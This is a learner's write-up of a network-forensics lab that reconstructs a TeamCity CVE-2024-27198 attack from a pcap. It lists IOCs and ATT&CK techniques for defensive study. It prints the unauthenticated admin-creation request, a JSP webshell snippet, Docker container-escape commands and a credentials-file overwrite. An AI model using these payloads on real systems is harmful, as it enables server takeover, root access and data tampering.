# Investigation: JetBrains TeamCity Web Server Exploitation

Source: CyberDefenders free lab, network traffic analysis in Wireshark.

## Scenario

I analyzed a pcap capturing an attacker exploiting a public facing TeamCity CI/CD server, starting from initial access all the way through persistence and privilege escalation attempts.

## What I did

I filtered traffic by `http` and followed the lab's hints to find a POST request involving a suspicious admin/plugin upload path. Used Follow HTTP Stream on the relevant requests so I could read full request and response bodies instead of just single packets.

## Timeline of the attack

**Version fingerprinting.** The attacker queried `/app/rest/server` and got back the server version, `2023.11.3`.

**Vulnerability identification.** I first assumed CVE-2023-42793 since it's the well known TeamCity auth bypass, but that CVE only affects versions before 2023.05.4, so it didn't match. I cross checked the version against known CVEs and found CVE-2024-27198 instead, an authentication bypass affecting versions before 2023.11.4, which lines up.

**Auth bypass leading to account creation.** The attacker sent a POST to `/app/rest/users` through a path traversal style URL that abused the vulnerability, creating a new user with username `c91oyemw`, password `CL5vzdwLuK`, and role `SYSTEM_ADMIN`. No authentication was required for this step. That's the actual vulnerability at work.

**Token generation and authenticated access.** The attacker generated an auth token for the new account and used it as a Bearer token in the Authorization header for everything after this point.

**Recon.** They queried `/app/rest/debug/jvm/systemProperties`, which pulled back server environment details like OS, Java version, file paths, and confirmed the process was running as root.

**Persistence through a webshell upload.** They uploaded a malicious plugin, `NSt8bHTg.zip`, through `/admin/pluginUpload.html`. Inside it was a JSP webshell, `NSt8bHTg.jsp`. The webshell accepts a `cmd` parameter and runs it through Java's ProcessBuilder, which gave the attacker the ability to run arbitrary commands on the server going forward.

**Privilege escalation and container escape attempts.** Using the webshell, the attacker tried three different Docker based container escape techniques:

```
docker run --rm -it --privileged ubuntu
docker run --rm -it -v /:/host ubuntu chroot /host
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu
```

The second one, mounting the host filesystem and chrooting into it, is the actual escape attempt. Right after, they ran `ls` and `whoami`, and `whoami` came back as `root`. That confirms they had root inside the container, though it's not fully clear from the traffic alone whether the escape to the actual host succeeded.

**Data manipulation.** The attacker checked and then overwrote `/tmp/Creds.txt`:

```bash
bash -c 'echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt'
```

New credentials written into the file: username `a1l4m`, password `youarecompromised`.

## IOCs

- Attacker-created username: `c91oyemw`
- Password: `CL5vzdwLuK`
- Webshell filename: `NSt8bHTg.jsp` / plugin: `NSt8bHTg.zip`
- Tampered file: `/tmp/Creds.txt`
- New credentials written into tampered file: `a1l4m` / `youarecompromised`

## MITRE ATT&CK mapping

- **Initial Access — T1190:** Exploit Public-Facing Application (CVE-2024-27198 auth bypass)
- **Persistence — T1505.003:** Server Software Component: Web Shell
- **Privilege Escalation — T1611:** Escape to Host (container escape attempts)
- **Impact — T1565.001:** Stored Data Manipulation (credentials file tampering)

## What this investigation covers and what it doesn't

This was detection and analysis, reconstructing what happened and how, not remediation. In a real incident the next steps would be patching TeamCity past 2023.11.4, removing the malicious admin account and plugin, rotating any potentially compromised credentials, and checking whether the attacker pivoted anywhere else using their root access.

## Evidence, raw traffic excerpts

Version fingerprinting response:
```
<server version="2023.11.3 (build 147512)" ...>
```

Unauthenticated account creation, the actual auth bypass:
```
POST /hax?jsp=/app/rest/users;.jsp HTTP/1.1
Host: 3.71.79.4:8111
Content-Type: application/json

{"username": "c91oyemw", "password": "CL5vzdwLuK", "email": "c91oyemw@example.com",
"roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
```

Webshell upload, extracted JSP content from inside the plugin zip:
```jsp
<%@ page import="java.util.Scanner" %>
<%
    String query = request.getParameter("cmd");
    ProcessBuilder pb;
    // builds and runs the cmd parameter as an OS command
    Process process = pb.start();
%>
```

Container escape attempt:
```
cmd=docker+run+--rm+-it+-v+%2F%3A%2Fhost+ubuntu+chroot+%2Fhost
decoded: docker run --rm -it -v /:/host ubuntu chroot /host
```

Recon confirming root:
```
cmd=whoami
response: root
```

Data manipulation, credentials file tampering:
```
cmd=bash+-c+%27echo+%22username%3Aa1l4m%2Cpassword%3Ayouarecompromised%22+%3E+%2Ftmp%2FCreds.txt%27
decoded: bash -c 'echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt'
```

## Takeaway

This mapped to a real, actively exploited CVE that's on CISA's KEV list, not a made up scenario. The investigation gave me practice reading raw HTTP streams, decoding URL encoded commands, and recognizing a recon, exploit, persistence, escalation, tampering pattern that I'd expect to see again across different attack types going forward.

Some of the specific technologies here, JSP webshells, ProcessBuilder, container escape mechanics, are ahead of what I've formally covered in my roadmap so far. I documented the behavior accurately, but full technical understanding of those specific pieces is still ahead of me.
